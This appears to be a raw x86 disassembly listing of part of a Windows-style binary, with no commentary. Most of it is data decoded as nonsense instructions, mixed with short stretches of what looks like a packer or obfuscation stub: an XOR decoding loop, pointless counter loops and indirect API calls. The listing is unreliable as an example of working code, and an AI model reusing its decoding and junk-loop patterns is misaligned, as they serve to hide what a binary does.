  4029b1:	jmp    0xac85:0xa7fd9bd
  4029b8:	mov    al,ds:0x350ce8dd
  4029bd:	imul   DWORD PTR [eax+0x4c]
  4029c0:	ss in  eax,dx
  4029c2:	jp     0x40295f
  4029c4:	inc    ebx
  4029c5:	mov    WORD PTR [esi+0x7f],?
  4029c8:	sbb    bh,0xae
  4029cb:	mov    edx,DWORD PTR [ecx]
  4029cd:	dec    eax
  4029ce:	mov    dh,0x41
  4029d0:	fwait
  4029d1:	(bad)  
  4029d2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4029d3:	repz inc ebp
  4029d5:	cmp    eax,0x5e59eb52
  4029da:	aad    0xf6
  4029dc:	out    0x7e,al
  4029de:	dec    ebp
  4029df:	inc    esi
  4029e0:	mov    cl,0x38
  4029e2:	cli    
  4029e3:	in     al,0xcd
  4029e5:	inc    edx
  4029e6:	shr    BYTE PTR [esi-0x1ab6a565],1
  4029ec:	jmp    0x4029e6
  4029ee:	les    eax,FWORD PTR [ebx+0x3c]
  4029f1:	test   DWORD PTR [eax+0x3ffea2d8],edi
  4029f7:	icebp  
  4029f8:	mov    DWORD PTR [esi],edx
  4029fa:	sbb    al,0x8e
  4029fc:	stos   BYTE PTR es:[edi],al
  4029fd:	cli    
  4029fe:	xchg   edi,eax
  4029ff:	inc    eax
  402a00:	popa   
  402a01:	mov    ecx,0xd52560f0
  402a06:	and    BYTE PTR [esi+0x2],ah
  402a09:	and    ebp,DWORD PTR [ebx+0x2e]
  402a0c:	pop    es
  402a0d:	inc    eax
  402a0e:	add    edi,DWORD PTR [ebp+0x10]
  402a11:	xor    edx,ecx
  402a13:	add    edx,esi
  402a15:	cmp    edx,edi
  402a17:	ja     0x402e5d
  402a1d:	push   ebx
  402a1e:	jmp    0x402a28
  402a23:	mov    esi,0x32729b
  402a28:	mov    eax,DWORD PTR [ebp-0x8]
  402a2b:	mov    edi,DWORD PTR [ebp-0x4]
  402a2e:	jmp    0x402c26
  402a33:	lock ss inc eax
  402a36:	xor    al,0x40
  402a38:	jo     0x402aaa
  402a3a:	repnz push ss
  402a3c:	pop    ds
  402a3d:	mov    ds:0xab48b280,al
  402a42:	test   DWORD PTR [eax+0xc],ebp
  402a45:	jle    0x402ac5
  402a47:	push   ebp
  402a48:	jg     0x402ac8
  402a4a:	jle    0x402a28
  402a4c:	in     eax,0x61
  402a4e:	push   edx
  402a4f:	jl     0x402a83
  402a51:	jns    0x402ab0
  402a53:	outs   dx,DWORD PTR ds:[esi]
  402a54:	into   
  402a55:	dec    ebx
  402a56:	(bad)  
  402a57:	call   0x1633:0x91bb21f9
  402a5e:	retf   
  402a5f:	cmc    
  402a60:	nop
  402a61:	inc    ebx
  402a62:	icebp  
  402a63:	loopne 0x402acf
  402a65:	sbb    DWORD PTR [esi+edi*4+0x51aa5854],esp
  402a6c:	fstp   QWORD PTR [ebx+0x4e]
  402a6f:	inc    eax
  402a70:	inc    edx
  402a71:	test   BYTE PTR [edi+0x6d],bh
  402a74:	(bad)  
  402a75:	push   ss
  402a76:	xadd   DWORD PTR [ebx+0x4f45b673],esp
  402a7d:	adc    BYTE PTR [ecx+0xeffbcf0],bl
  402a83:	sti    
  402a84:	add    DWORD PTR [edx],0xe2ad6aec
  402a8a:	scas   al,BYTE PTR es:[edi]
  402a8b:	leave  
  402a8c:	pushf  
  402a8d:	out    dx,al
  402a8e:	or     BYTE PTR [ecx+esi*1],ah
  402a91:	mov    DWORD PTR [eax],edx
  402a93:	sub    bh,BYTE PTR [ebp+edi*8+0x5d]
  402a97:	addr16 lock push ecx
  402a9a:	gs push cs
  402a9c:	loopne 0x402a50
  402a9e:	in     al,dx
  402a9f:	sub    BYTE PTR [ebx],al
  402aa1:	cdq    
  402aa2:	push   0x91755452
  402aa7:	dec    edi
  402aa8:	push   ds
  402aa9:	xchg   esi,eax
  402aaa:	push   edx
  402aab:	and    eax,0xd6494f40
  402ab0:	sub    eax,0x490f9d5a
  402ab5:	or     DWORD PTR [edx],edi
  402ab7:	sub    bh,BYTE PTR [esi-0x455b10]
  402abd:	sbb    dl,BYTE PTR [esi+eax*2]
  402ac0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402ac1:	jne    0x402b0d
  402ac3:	fisub  WORD PTR [esi]
  402ac5:	sbb    cl,0xd1
  402ac8:	jnp    0x402a86
  402aca:	dec    eax
  402acb:	(bad)  
  402acc:	je     0x402b22
  402ace:	jmp    0x8111d386
  402ad3:	retf   0x6e91
  402ad6:	cmc    
  402ad7:	xor    al,0x2c
  402ad9:	dec    eax
  402ada:	dec    eax
  402adb:	aaa    
  402adc:	fmul   QWORD PTR [edx]
  402ade:	dec    edx
  402adf:	sbb    al,0x22
  402ae1:	and    al,0xac
  402ae3:	(bad)
  402ae8:	and    eax,0xb1c1feee
  402aed:	aas    
  402aee:	jmp    0x422a:0x9cbd9763
  402af5:	inc    ebp
  402af6:	out    0x42,eax
  402af8:	xor    BYTE PTR [edx+0x25],al
  402afb:	dec    edx
  402afc:	shl    ebp,0x9
  402aff:	jno    0x402afd
  402b01:	es nop
  402b03:	push   esi
  402b04:	call   0x9177:0x32001293
  402b0b:	dec    ecx
  402b0c:	(bad)  
  402b0d:	ins    DWORD PTR es:[edi],dx
  402b0e:	jmp    0x402b5b
  402b10:	shr    dh,1
  402b12:	add    al,0xb0
  402b14:	inc    esi
  402b15:	cmp    DWORD PTR [ebp-0xd],ebx
  402b18:	js     0x402b41
  402b1a:	dec    ebx
  402b1b:	xlat   BYTE PTR ds:[ebx]
  402b1c:	mov    ebp,0xe6bd2387
  402b21:	mov    ds,edi
  402b23:	jle    0x402b9a
  402b25:	push   cs
  402b26:	js     0x402b41
  402b28:	push   edi
  402b29:	mov    dh,0x80
  402b2b:	scas   eax,DWORD PTR es:[edi]
  402b2c:	scas   eax,DWORD PTR es:[edi]
  402b2d:	cmp    al,BYTE PTR [esi]
  402b2f:	or     eax,0xe46aefb
  402b34:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402b35:	add    BYTE PTR ds:0x6e7a8eb0,0x9c
  402b3c:	int    0x20
  402b3e:	ins    DWORD PTR es:[edi],dx
  402b3f:	imul   esp,ebp,0x5613e415
  402b45:	mov    ah,0x9
  402b48:	imul   esp,edi,0xffffffbb
  402b4b:	in     al,dx
  402b4c:	pushf  
  402b4d:	mov    ecx,0x3249ec89
  402b52:	fisubr DWORD PTR [ebp+0xa8cdd2a]
  402b58:	ins    DWORD PTR es:[edi],dx
  402b59:	not    bl
  402b5b:	add    al,0xda
  402b5d:	ret    
  402b5e:	or     ah,BYTE PTR [eax*2-0x3878b3b7]
  402b65:	add    eax,DWORD PTR [ebx+ebx*4]
  402b68:	sti    
  402b69:	inc    ebp
  402b6a:	arpl   ax,ax
  402b6c:	js     0x402b84
  402b6e:	es iret 
  402b70:	xchg   ebx,eax
  402b71:	push   ebx
  402b72:	jmp    0x402ba0
  402b74:	xor    eax,0xa0cf5bf8
  402b79:	jno    0x402b95
  402b7b:	fwait
  402b7c:	in     eax,0x42
  402b7e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402b7f:	or     BYTE PTR [edx],bl
  402b81:	sub    DWORD PTR [edx-0x34a6aba7],esp
  402b87:	ret    
  402b88:	pop    eax
  402b89:	in     eax,dx
  402b8a:	(bad)  
  402b8b:	in     eax,0x70
  402b8d:	into   
  402b8e:	push   ds
  402b8f:	hlt    
  402b90:	aam    0x9b
  402b92:	jb     0x402b90
  402b94:	sqrtps xmm6,XMMWORD PTR [esi-0x7239afce]
  402b9b:	cmc    
  402b9c:	rol    BYTE PTR [edi],1
  402b9e:	cdq    
  402b9f:	xchg   edx,eax
  402ba0:	mov    edx,0x5bc4df5b
  402ba5:	push   0xffffffb7
  402ba7:	cld    
  402ba8:	adc    ebp,esp
  402baa:	fs xchg ebx,eax
  402bac:	fwait
  402bad:	sbb    eax,0xa93f1ad7
  402bb2:	lock stos BYTE PTR es:[edi],al
  402bb4:	(bad)  
  402bb5:	leave  
  402bb6:	in     eax,dx
  402bb7:	sbb    cl,cl
  402bb9:	add    bl,BYTE PTR [eax+0x5a908ba4]
  402bbf:	pop    ecx
  402bc0:	adc    eax,0x72ffec43
  402bc5:	cld    
  402bc6:	dec    ebp
  402bc7:	xor    eax,0xdda2009b
  402bcc:	cdq    
  402bcd:	sahf   
  402bce:	ret    0x6a31
  402bd1:	and    BYTE PTR [eax],al
  402bd3:	std    
  402bd4:	cwde   
  402bd5:	mov    ds:0xdefa8a3b,al
  402bda:	outs   dx,BYTE PTR ds:[esi]
  402bdb:	pop    edx
  402bdc:	or     DWORD PTR [ebp-0x51],0x71
  402be0:	push   esi
  402be1:	ins    BYTE PTR es:[edi],dx
  402be2:	inc    edx
  402be3:	cld    
  402be4:	lahf   
  402be5:	jne    0x402bc2
  402be7:	inc    ebx
  402be8:	and    al,0xe4
  402bea:	data16 sbb BYTE PTR [edi],ah
  402bed:	jmp    0x6e3e:0xe5a768b0
  402bf4:	mov    edi,0xbcd1baec
  402bf9:	dec    ebp
  402bfa:	ins    DWORD PTR es:[edi],dx
  402bfb:	mov    ecx,DWORD PTR [ebx]
  402bfd:	in     eax,0x5f
  402bff:	push   edx
  402c00:	mov    al,ds:0x93e81341
  402c05:	mov    ds:0x7a53ad0b,al
  402c0a:	jmp    0x402c63
  402c0c:	adc    eax,0x47a87ded
  402c11:	loope  0x402ba3
  402c13:	mov    ebp,0x93c575ea
  402c18:	inc    esi
  402c19:	adc    edi,DWORD PTR [ebp+0xba61f2]
  402c1f:	fsubr  st(6),st
  402c21:	xchg   ebp,eax
  402c22:	mov    ch,0xa
  402c24:	dec    edx
  402c25:	shl    DWORD PTR [ebx],1
  402c27:	stc    
  402c28:	add    edi,esi
  402c2a:	mov    esi,DWORD PTR [ebp+0x8]
  402c2d:	imul   edi,edx
  402c30:	mov    ebx,DWORD PTR [ebp+0xc]
  402c33:	xor    eax,ecx
  402c35:	add    eax,edx
  402c37:	mov    al,BYTE PTR [ebx+eax*1+0x32729b]
  402c3e:	mov    BYTE PTR [edi+esi*1],al
  402c41:	mov    eax,DWORD PTR [ebp-0x4]
  402c44:	xor    eax,ecx
  402c46:	lea    edx,[edx+eax*1+0x32729b]
  402c4d:	mov    eax,DWORD PTR [ebp-0x4]
  402c50:	xor    eax,ecx
  402c52:	mov    esi,0xffcd8d65
  402c57:	sub    esi,eax
  402c59:	jmp    0x402e51
  402c5e:	outs   dx,BYTE PTR ds:[esi]
  402c5f:	add    ebx,DWORD PTR [edi+0x6f72734e]
  402c65:	and    ebp,DWORD PTR [esi]
  402c67:	add    al,0x68
  402c69:	mov    dh,0xa7
  402c6b:	cmc    
  402c6c:	aad    0xec
  402c6e:	dec    edi
  402c6f:	or     bh,BYTE PTR [esi+0x7e]
  402c72:	push   ebp
  402c73:	jg     0x402cf3
  402c75:	jle    0x402c31
  402c77:	and    WORD PTR [ebx],sp
  402c7a:	jae    0x402ca0
  402c7c:	pop    edx
  402c7d:	(bad)  
  402c7e:	add    edx,DWORD PTR [edi]
  402c80:	sbb    DWORD PTR [ebx-0x79b6d983],eax
  402c86:	add    eax,0x3a481fb8
  402c8b:	jecxz  0x402cbb
  402c8d:	aaa    
  402c8e:	mov    al,0x59
  402c90:	pushf  
  402c91:	mov    ebx,0x2b1b8659
  402c96:	cdq    
  402c97:	mov    edi,0xb8df5f43
  402c9c:	test   eax,0x304d4ed6
  402ca1:	jl     0x402c4c
  402ca3:	pop    ebp
  402ca4:	bound  ecx,QWORD PTR [esi]
  402ca6:	shl    BYTE PTR [edi],1
  402ca8:	or     ecx,DWORD PTR [edx+0x60]
  402cab:	das    
  402cac:	loop   0x402cd8
  402cae:	sbb    BYTE PTR [eax-0x3058bfcf],dh
  402cb4:	cmp    BYTE PTR [ebx+ecx*4+0x6a],bh
  402cb8:	dec    DWORD PTR [ecx-0x20c2b79c]
  402cbe:	(bad)  
  402cbf:	hlt    
  402cc0:	inc    ecx
  402cc1:	mov    eax,ds:0x7626ea43
  402cc6:	sti    
  402cc7:	pop    eax
  402cc8:	in     al,dx
  402cc9:	fprem1 
  402ccb:	outs   dx,DWORD PTR ds:[esi]
  402ccc:	stos   BYTE PTR es:[edi],al
  402ccd:	das    
  402cce:	sbb    esi,DWORD PTR [esi-0x39]
  402cd1:	jno    0x402c70
  402cd3:	pop    eax
  402cd4:	jns    0x402d1d
  402cd6:	stos   BYTE PTR es:[edi],al
  402cd7:	xchg   DWORD PTR [esp+edx*1-0x9],esi
  402cdb:	adc    bh,BYTE PTR [edi]
  402cdd:	sub    WORD PTR [edx+esi*4+0x25a7dfc3],dx
  402ce5:	mov    ch,0xc9
  402ce7:	fild   DWORD PTR [esi+eax*2-0x2]
  402ceb:	sbb    ebx,eax
  402ced:	xchg   edi,eax
  402cee:	adc    eax,0xf278d8de
  402cf3:	fld    QWORD PTR ds:[ecx+0x58b73157]
  402cfa:	jge    0x402d46
  402cfc:	add    eax,0xdf9a82ed
  402d01:	in     eax,dx
  402d02:	xchg   esi,eax
  402d03:	inc    esi
  402d04:	repz xchg edi,eax
  402d06:	mov    edi,0xf7ffd0b6
  402d0b:	pop    es
  402d0c:	js     0x402d7a
  402d0e:	dec    ebx
  402d0f:	and    eax,0x5eeac434
  402d14:	std    
  402d15:	retf   0x877d
  402d18:	mov    bh,0x3f
  402d1a:	rol    DWORD PTR [ecx+ebx*4-0x2e340f36],1
  402d21:	aam    0xa7
  402d23:	pop    edx
  402d24:	add    al,0x34
  402d26:	adc    BYTE PTR [edx+0xc],dh
  402d29:	das    
  402d2a:	cmps   BYTE PTR fs:[esi],BYTE PTR es:[edi]
  402d2c:	ins    DWORD PTR es:[edi],dx
  402d2d:	xchg   esi,eax
  402d2e:	and    eax,DWORD PTR [esi-0x20]
  402d31:	mov    DWORD PTR [di-0x56],edx
  402d35:	jns    0x402d26
  402d37:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402d38:	pop    ecx
  402d39:	int3   
  402d3a:	jbe    0x402d2a
  402d3c:	out    dx,eax
  402d3d:	jmp    0x402d57
  402d3f:	dec    esp
  402d40:	popf   
  402d41:	lods   eax,DWORD PTR ds:[esi]
  402d42:	scas   eax,DWORD PTR es:[edi]
  402d43:	sti    
  402d44:	cld    
  402d45:	pop    esp
  402d46:	xor    ax,0x9179
  402d4a:	jmp    0xe9f1:0x925ff51
  402d51:	pop    ebx
  402d52:	or     BYTE PTR [ebx+0x5b08cea6],al
  402d58:	sar    dh,0x19
  402d5b:	push   esi
  402d5c:	(bad)  
  402d5d:	jb     0x402d23
  402d5f:	in     eax,dx
  402d60:	cli    
  402d61:	push   esi
  402d62:	push   ebx
  402d63:	jb     0x402cf4
  402d65:	or     DWORD PTR [esi+0x3f294f88],ebp
  402d6b:	int    0xbf
  402d6d:	and    bh,BYTE PTR [esi+0x1b]
  402d70:	mov    al,ds:0xabfd3180
  402d75:	cwde   
  402d76:	mov    ecx,0x7d1565b2
  402d7b:	stc    
  402d7c:	cs js  0x402d99
  402d7f:	jnp    0x402d3d
  402d81:	add    BYTE PTR [esi+0x1c],bl
  402d84:	fcomp  st(3)
  402d86:	lods   al,BYTE PTR ds:[esi]
  402d87:	fdiv   QWORD PTR [ecx+0x69]
  402d8a:	stos   DWORD PTR es:[edi],eax
  402d8b:	or     DWORD PTR [esi],edx
  402d8d:	aaa    
  402d8e:	inc    eax
  402d8f:	push   esi
  402d90:	push   cs
  402d91:	inc    eax
  402d92:	cld    
  402d93:	xlat   BYTE PTR ds:[ebx]
  402d94:	test   BYTE PTR [ebp-0x47],dh
  402d97:	in     al,dx
  402d98:	xor    eax,0xd0f0ecec
  402d9d:	mov    DWORD PTR [ebp+ebx*4-0x56],esi
  402da1:	add    DWORD PTR [eax],eax
  402da3:	(bad)  
  402da4:	adc    al,0x23
  402da6:	inc    ecx
  402da7:	or     al,0x55
  402da9:	mov    bh,BYTE PTR [ecx]
  402dab:	cmovno edx,DWORD PTR [eax-0x3348888f]
  402db2:	cmps   BYTE PTR fs:[esi],BYTE PTR es:[edi]
  402db4:	jmp    0xdb9a:0x32d2523
  402dbb:	ret    
  402dbc:	jae    0x402de6
  402dbe:	fild   WORD PTR [ebx]
  402dc0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402dc1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402dc2:	fs jne 0x402d6c
  402dc5:	int    0xf2
  402dc7:	dec    edi
  402dc8:	or     eax,0x21834c34
  402dcd:	jnp    0x402d8b
  402dcf:	mov    al,ch
  402dd1:	rcl    BYTE PTR [eax-0x52bfd09c],cl
  402dd7:	push   ds
  402dd8:	pop    ss
  402dd9:	fist   WORD PTR [ecx]
  402ddb:	clc    
  402ddc:	out    0x3b,eax
  402dde:	sbb    ch,bh
  402de0:	int    0xf5
  402de2:	mov    bh,BYTE PTR [esp+esi*4-0x37606e36]
  402de9:	mov    WORD PTR [ecx-0x4c],?
  402dec:	mov    esi,0x2bdf807e
  402df1:	mov    eax,0x48802310
  402df6:	sbb    DWORD PTR [edi-0x70b0900b],0x1006d5a6
  402e00:	lods   al,BYTE PTR ds:[esi]
  402e01:	div    BYTE PTR [esi+0x3a9121be]
  402e07:	or     eax,0xd04cb88
  402e0c:	aad    0x18
  402e0e:	mov    ds,eax
  402e10:	jbe    0x402dfc
  402e12:	cdq    
  402e13:	popa   
  402e14:	push   ss
  402e15:	push   esp
  402e16:	cmp    BYTE PTR [ecx-0x25678b0],dl
  402e1c:	lahf   
  402e1d:	sub    eax,0xc2355ce5
  402e22:	data16 daa 
  402e24:	push   0x35
  402e26:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402e27:	outs   dx,DWORD PTR ds:[esi]
  402e28:	dec    eax
  402e29:	push   ebp
  402e2a:	jbe    0x402e5d
  402e2c:	test   BYTE PTR [esi-0x43d2ab0a],bh
  402e32:	dec    ecx
  402e33:	cld    
  402e34:	fnstsw WORD PTR [ecx+eax*4+0x19]
  402e38:	(bad)  
  402e3a:	call   0x86bac0b8
  402e3f:	sub    DWORD PTR [esi],esp
  402e41:	test   DWORD PTR [esi+eiz*8-0x24c8c486],0x1bd620db
  402e4c:	daa    
  402e4d:	add    esp,DWORD PTR [esi]
  402e4f:	mov    BYTE PTR [ebx+0x3b107503],al
  402e55:	(bad)  
  402e56:	jbe    0x402a23
  402e5c:	pop    ebx
  402e5d:	mov    eax,0xf89c8532
  402e62:	pop    edi
  402e63:	pop    esi
  402e64:	leave  
  402e65:	ret    0xc
  402e68:	push   ebp
  402e69:	mov    ebp,esp
  402e6b:	sub    esp,0x58
  402e6e:	mov    ecx,DWORD PTR [ebp+0x8]
  402e71:	mov    eax,0x8a3c
  402e76:	xor    ax,WORD PTR [ecx+0x20]
  402e7a:	mov    ecx,0x3b02
  402e7f:	add    ax,cx
  402e82:	or     DWORD PTR ds:0x42e650,edi
  402e88:	movzx  eax,ax
  402e8b:	mov    ecx,DWORD PTR ds:0x4302b5
  402e91:	xor    ecx,DWORD PTR ds:0x42ec53
  402e97:	mov    DWORD PTR ds:0x4302b5,ecx
  402e9d:	mov    DWORD PTR [ebp-0xc],eax
  402ea0:	mov    BYTE PTR [ebp-0x1],0x7f
  402ea4:	sub    ecx,0x18d2
  402eaa:	lea    eax,[ebp-0x1]
  402ead:	and    DWORD PTR ds:0x42ec6f,0x0
  402eb7:	jmp    0x402ec9
  402ebc:	mov    ecx,DWORD PTR ds:0x42ec6f
  402ec2:	inc    ecx
  402ec3:	mov    DWORD PTR ds:0x42ec6f,ecx
  402ec9:	cmp    DWORD PTR ds:0x42ec6f,0x18
  402ed0:	jae    0x402fa2
  402ed6:	cmp    DWORD PTR ds:0x42ec6f,0x1a
  402edd:	jne    0x402eee
  402ee3:	push   0x2d42
  402ee8:	call   DWORD PTR ds:0x42e91b
  402eee:	jmp    0x402ebc
  402ef3:	mov    DWORD PTR ds:0x42ec67,0x17
  402efd:	cmp    DWORD PTR ds:0x42ec67,0x0
  402f04:	je     0x402fa2
  402f0a:	cmp    DWORD PTR ds:0x42ec67,0x7
  402f11:	jne    0x402f2c
  402f17:	push   0x25f8
  402f1c:	push   0x4302c9
  402f21:	push   0x42e737
  402f26:	call   DWORD PTR ds:0x42e833
  402f2c:	cmp    DWORD PTR ds:0x42ec67,0x8
  402f33:	jne    0x402f48
  402f39:	xor    ecx,ecx
  402f3b:	or     ecx,DWORD PTR ds:0x42ec67
  402f41:	dec    ecx
  402f42:	mov    DWORD PTR ds:0x42ec67,ecx
  402f48:	mov    ecx,DWORD PTR ds:0x42ec67
  402f4e:	dec    ecx
  402f4f:	mov    DWORD PTR ds:0x42ec67,ecx
  402f55:	jmp    0x402efd
  402f5a:	and    DWORD PTR ds:0x42ec4f,0x0
  402f64:	mov    ecx,DWORD PTR ds:0x42ec4f
  402f6a:	inc    ecx
  402f6b:	mov    DWORD PTR ds:0x42ec4f,ecx
  402f71:	cmp    DWORD PTR ds:0x42ec4f,0x16
  402f78:	jne    0x402f8f
  402f7e:	push   DWORD PTR [ebp-0xc]
  402f81:	push   0x4302ed
  402f86:	push   DWORD PTR [ebp-0x24]
  402f89:	call   DWORD PTR ds:0x42e847
  402f8f:	cmp    DWORD PTR ds:0x42ec4f,0x10
  402f96:	jb     0x402f64
  402f9c:	add    DWORD PTR ds:0x42ec4b,ebx
  402fa2:	mov    DWORD PTR [ebp-0x10],eax
  402fa5:	mov    DWORD PTR ds:0x4302d5,0x10
  402faf:	cmp    DWORD PTR ds:0x4302d5,0x0
  402fb6:	je     0x403010
  402fbc:	cmp    DWORD PTR ds:0x4302d5,0x4
  402fc3:	jne    0x402fda
  402fc9:	push   DWORD PTR [ebp-0x1c]
  402fcc:	push   DWORD PTR [ebp-0x20]
  402fcf:	push   0x42e6ad
  402fd4:	call   DWORD PTR ds:0x42e84b
  402fda:	cmp    DWORD PTR ds:0x4302d5,0x5
  402fe1:	jne    0x402ff4
  402fe7:	mov    ecx,DWORD PTR ds:0x4302d5
  402fed:	dec    ecx
  402fee:	mov    DWORD PTR ds:0x4302d5,ecx
  402ff4:	mov    ecx,DWORD PTR ds:0x4302d5
  402ffa:	dec    ecx
  402ffb:	mov    DWORD PTR ds:0x4302d5,ecx
  403001:	jmp    0x402faf
  403006:	and    DWORD PTR ds:0x4302ed,0x3a0f
  403010:	mov    al,BYTE PTR [ebp-0x1]
  403013:	mov    ecx,DWORD PTR ds:0x42e640
  403019:	add    DWORD PTR ds:0x42ec73,ecx
  40301f:	mov    ecx,DWORD PTR [ebp-0x10]
  403022:	mov    DWORD PTR ds:0x43035b,0x1b71
  40302c:	xor    al,0x46
  40302e:	sub    al,0x38
  403030:	or     DWORD PTR ds:0x42e648,0x7677
  40303a:	mov    BYTE PTR [ecx],al
  40303c:	not    eax
  40303e:	jmp    0x40320b
  403043:	loop   0x40305e
  403045:	fcom   DWORD PTR [ebp+0x697355e1]
  40304b:	popf   
  40304c:	mov    DWORD PTR [ecx-0x48],ebp
  40304f:	mov    ecx,0xa2d91659
  403054:	or     BYTE PTR [esi+0x7e],bh
  403057:	scas   al,BYTE PTR es:[edi]
  403058:	jg     0x4030d8
  40305a:	jle    0x4030ac
  40305c:	xor    ch,0xa5
  40305f:	stc    
  403060:	popa   
  403061:	push   ebx
  403062:	mov    eax,ds:0xc09715d0
  403067:	mov    esp,0x175fd7db
  40306c:	out    0xec,al
  40306e:	inc    edx
  40306f:	sub    eax,0x9dcb1538
  403074:	and    al,0xde
  403076:	jns    0x4030ed
  403078:	sbb    eax,0xd5f76fbd
  40307d:	jae    0x403083
  40307f:	in     al,dx
  403080:	lock aad 0x9c
  403083:	push   0x37d4322e
  403088:	lds    eax,FWORD PTR [ebp*2-0x3893b58f]
  40308f:	js     0x40304d
  403091:	popa   
  403092:	mov    al,0xa3
  403094:	movlps xmm1,QWORD PTR [eax-0x12]
  403098:	iret   
  403099:	ret    0xece
  40309c:	mov    edx,DWORD PTR [bp+0x12]
  4030a0:	pop    ebx
  4030a1:	or     DWORD PTR [ebx],eax
  4030a3:	push   ss
  4030a4:	dec    esp
  4030a5:	std    
  4030a6:	push   edx
  4030a7:	sbb    eax,DWORD PTR [ecx-0x3d]
  4030aa:	xchg   esi,ecx
  4030ac:	xor    eax,0xfc1d428f
  4030b1:	hlt    
  4030b2:	mov    ah,0x35
  4030b4:	inc    ecx
  4030b5:	sub    BYTE PTR [eax+esi*4-0xb5ec359],dl
  4030bc:	into   
  4030bd:	pop    ss
  4030be:	(bad)  
  4030bf:	pop    edx
  4030c0:	and    ah,cl
  4030c2:	(bad)  
  4030c3:	ds jmp 0x92800904
  4030c9:	in     eax,0xc1
  4030cb:	test   esp,eax
  4030cd:	scas   eax,DWORD PTR es:[edi]
  4030ce:	xor    ebx,ebx
  4030d0:	push   DWORD PTR [eax-0x5a4a95db]
  4030d6:	std    
  4030d7:	daa    
  4030d8:	in     al,dx
  4030d9:	sub    bh,dl
  4030db:	and    eax,0x5ae112f
  4030e0:	jmp    FWORD PTR [ebx-0x1dd06acd]
  4030e6:	jo     0x403125
  4030e8:	cwde   
  4030e9:	or     dl,BYTE PTR [edx-0x20]
  4030ec:	loopne 0x403115
  4030ee:	xchg   ebx,eax
  4030ef:	and    al,0xe9
  4030f1:	cmp    BYTE PTR [ecx],0xc7
  4030f4:	mov    al,0xed
  4030f6:	out    dx,al
  4030f7:	push   ecx
  4030f8:	cmp    BYTE PTR [ecx+ebx*4-0x7d],bh
  4030fc:	push   eax
  4030fd:	push   es
  4030fe:	mov    eax,0x21adea0b
  403103:	mov    ah,0xf7
  403105:	stos   DWORD PTR es:[edi],eax
  403106:	and    cl,BYTE PTR [ecx]
  403108:	xchg   edi,eax
  403109:	mov    bl,0xf1
  40310b:	mov    BYTE PTR [ebp+ecx*8-0x17],ch
  40310f:	lea    ebp,ds:0x53ecd645
  403115:	rol    DWORD PTR [ebp+0x7a],0x52
  403119:	loopne 0x4030b3
  40311b:	sbb    eax,0x25c7eb25
  403120:	dec    edx
  403121:	mov    dl,al
  403123:	fisttp WORD PTR [edx-0x51]
  403126:	jge    0x40312c
  403128:	in     al,dx
  403129:	sub    BYTE PTR [ecx-0x175ff28d],ah
  40312f:	je     0x40316c
  403131:	or     esi,DWORD PTR [ecx-0x5b]
  403134:	jle    0x4030de
  403136:	dec    ecx
  403137:	cmp    eax,0xfdbdf1af
  40313c:	test   al,0xb8
  40313e:	enter  0x21b6,0x31
  403142:	popa   
  403143:	mov    BYTE PTR [ebp+0x5b],al
  403146:	int    0xf6
  403148:	dec    ecx
  403149:	adc    BYTE PTR [esi+0x53acdf54],ah
  40314f:	stos   BYTE PTR es:[edi],al
  403150:	xchg   esp,eax
  403151:	std    
  403152:	xchg   esp,eax
  403153:	test   eax,0xc3c63af8
  403158:	dec    ecx
  403159:	hlt    
  40315a:	aad    0x23
  40315c:	idiv   edx
  40315e:	pop    ebx
  40315f:	js     0x403190
  403161:	xor    bh,BYTE PTR [esi-0x405eac66]
  403167:	jb     0x403162
  403169:	scas   al,BYTE PTR es:[edi]
  40316a:	or     DWORD PTR [edx-0x2f],eax
  40316d:	pop    edi
  40316e:	dec    esp
  40316f:	jge    0x4031c0
  403171:	clc    
  403172:	aaa    
  403173:	inc    ebx
  403174:	fbld   TBYTE PTR [edx]
  403176:	out    0x43,eax
  403178:	mov    WORD PTR [edx+0xd],es
  40317b:	pop    eax
  40317c:	mov    cl,0x8f
  40317e:	mov    edi,es
  403180:	(bad)  
  403181:	emms   
  403183:	sbb    al,0x80
  403185:	push   ebp
  403186:	add    bl,BYTE PTR [edx]
  403188:	pop    edx
  403189:	sbb    bl,BYTE PTR [esi+0x3f3b8a60]
  40318f:	fs out dx,eax
  403191:	(bad)  [edx-0x342e67b3]
  403197:	fstp   QWORD PTR [esi+0x7f]
  40319a:	jo     0x4031de
  40319c:	enter  0x4397,0x13
  4031a0:	stos   DWORD PTR es:[edi],eax
  4031a1:	jno    0x403188
  4031a3:	mov    ecx,0x64b50209
  4031a8:	int    0x96
  4031aa:	je     0x40316d
  4031ac:	js     0x403186
  4031ae:	mov    ebx,DWORD PTR ds:0xf6d9c609
  4031b4:	(bad)  
  4031b5:	or     eax,0xc6f7aa48
  4031ba:	xor    al,BYTE PTR [edi+0x31]
  4031bd:	dec    edx
  4031be:	and    bh,BYTE PTR [eax+ecx*8-0x32abd3fa]
  4031c5:	add    dl,BYTE PTR [edx+0x2f616d7c]
  4031cb:	mov    al,ds:0x761397e0
  4031d0:	mov    esp,0xf64b07bf
  4031d5:	jnp    0x403217
  4031d7:	sbb    eax,DWORD PTR [edx+esi*2+0x79]
  4031db:	or     al,0xaa
  4031dd:	ja     0x403215
  4031df:	jge    0x403212
  4031e1:	outs   dx,BYTE PTR ds:[esi]
  4031e2:	push   esp
  4031e3:	add    DWORD PTR [ebx+ebp*4+0x69],esi
  4031e7:	sub    al,BYTE PTR ds:0xd692299
  4031ed:	sbb    ecx,eax
  4031ef:	mov    ebp,0xf00e5a32
  4031f4:	push   ebx
  4031f5:	fwait
  4031f6:	dec    edx
  4031f7:	loope  0x4031eb
  4031f9:	vphsubwd xmm0,XMMWORD PTR [ecx]
  4031fe:	in     eax,0xdc
  403200:	mov    ecx,DWORD PTR [ebp-0x5ad00bc6]
  403206:	push   0xa59957fa
  40320b:	mov    DWORD PTR [ebp-0x8],0xf89c8531
  403212:	mov    DWORD PTR [ebp-0x10],0xf89c8532
  403219:	or     DWORD PTR ds:0x42ec6f,ecx
  40321f:	mov    eax,DWORD PTR [ebp-0x8]
  403222:	movzx  ecx,WORD PTR ds:0x42ec4b
  403229:	adc    DWORD PTR ds:0x430357,ecx
  40322f:	mov    ecx,0x7510854
